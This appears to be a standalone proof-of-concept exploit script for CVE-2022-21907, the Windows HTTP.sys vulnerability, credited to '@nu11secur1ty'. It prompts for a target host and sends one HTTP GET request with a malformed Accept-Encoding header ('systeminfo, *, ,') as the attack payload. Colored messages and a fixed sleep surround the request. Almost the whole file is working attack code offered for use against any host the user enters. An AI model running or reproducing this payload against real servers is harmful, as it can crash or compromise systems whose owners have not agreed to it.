#!/usr/bin/python
# Author @nu11secur1ty
# CVE-2022-21907

from colorama import init, Fore, Back, Style
init(convert=True)
import requests
import time

print(Fore.RED +"Please input your host...\n")
print(Style.RESET_ALL)

print(Fore.YELLOW)
host = input()
print(Style.RESET_ALL)

print(Fore.BLUE + "Sending of especially malicious crafted packages, please wait...")
print(Style.RESET_ALL)
time.sleep(17)

print(Fore.GREEN)
# The PoC :)
poc = requests.get(f'http://{host}/', headers = {'Accept-Encoding':
'systeminfo, *, ,',})
# Not necessary :)
print(poc,"\n")
print(Style.RESET_ALL)
